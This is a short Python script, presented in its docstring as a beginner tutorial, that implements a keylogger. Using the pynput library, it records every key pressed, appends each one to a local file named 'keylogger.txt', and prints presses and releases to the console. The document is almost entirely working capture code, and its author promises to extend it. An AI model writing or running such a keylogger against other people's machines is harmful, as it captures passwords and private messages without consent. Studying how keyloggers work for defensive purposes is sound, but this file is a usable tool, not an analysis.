'''
Hi this is a tutorial for understanding and development of keylogger in python.
This is a very simple keylogger but we will try to improve it with time.
'''

import pynput
from pynput.keyboard import Key, Listener

key_list = list()

def write_in_file(key):
    with open('keylogger.txt','a') as f:
        f.write(str(key))

def on_press(key):
    key_list.append(key)
    write_in_file(key)
    print('key %s is typed' %(key))

def on_release(key):
    print('key %s is released' %(key))

def start_listner():
    with Listener(on_press,on_release) as listner :
        listner.join()

def main():
    start_listner()

if __name__ == '__main__':
    main()